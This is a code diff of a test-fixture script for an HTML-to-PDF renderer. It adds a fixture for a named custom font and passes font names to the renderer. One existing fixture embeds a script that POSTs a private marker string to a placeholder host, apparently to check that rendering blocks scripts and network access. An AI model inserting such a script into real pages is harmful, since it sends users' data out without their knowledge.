@@ -78,6 +78,9 @@ const inputs = { invoice: await fixture('invoice'), report: await fixture('repor
     css: "body {font-family:Inter,'Noto Sans Math'}", previewDpi: 72,
     fontFiles: ['NotoSansMath-Regular.ttf'],
     assetTexts: { 'brand/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="#175c52"/></svg>' } },
+  'named-font': { html: '<h1>Named font alias</h1><p>Integral: ⨌</p>', defaultStyles: false, previewDpi: 96,
+    css: '@font-face {font-family:Brand;src:url("fonts/Café Brand.ttf")} body {font-family:Brand;font-size:20px} h1{font-weight:400}',
+    fontFiles: ['NotoSansMath-Regular.ttf'], fontNames: ['Café Brand.ttf'] },
   static: { html: '<script>globalThis.documentUploadExecuted = true; fetch("https://fullbleed-invalid.example/upload", {method:"POST",body:"PRIVATE_BROWSER_MARKER"});</script><h1>PRIVATE_BROWSER_MARKER</h1><img src="https://fullbleed-invalid.example/picture.png">', css: '', previewDpi: 0 },
 };
 assert.equal(hash(await readFile('test/fonts/FullbleedCJKTest-Regular.ttf')), tableWrappingSource.fontSha256);
@@ -87,8 +90,11 @@ for (const file of new Set(Object.values(inputs).flatMap(input => input.fontFile
 await writeFile(join(site, 'fixtures/inputs.json'), JSON.stringify(inputs, null, 2) + '\n');
 const baselines = {};
 for (const [name, fixture] of Object.entries(inputs)) {
-  const { fontFiles = [], assetTexts = {}, ...options } = fixture;
-  options.fonts = await Promise.all(fontFiles.map(file => readFile(join(site, 'fixtures', file))));
+  const { fontFiles = [], fontNames = [], assetTexts = {}, ...options } = fixture;
+  options.fonts = await Promise.all(fontFiles.map(async (file, i) => {
+    const data = await readFile(join(site, 'fixtures', file));
+    return fontNames[i] ? { name: fontNames[i], data } : data;
+  }));
   options.assets = Object.fromEntries(Object.entries(assetTexts).map(([key, value]) => [key, Buffer.from(value)]));
   const result = await node.renderPdf(options);
   await writeFile(join(out, name + '.pdf'), result.pdf);
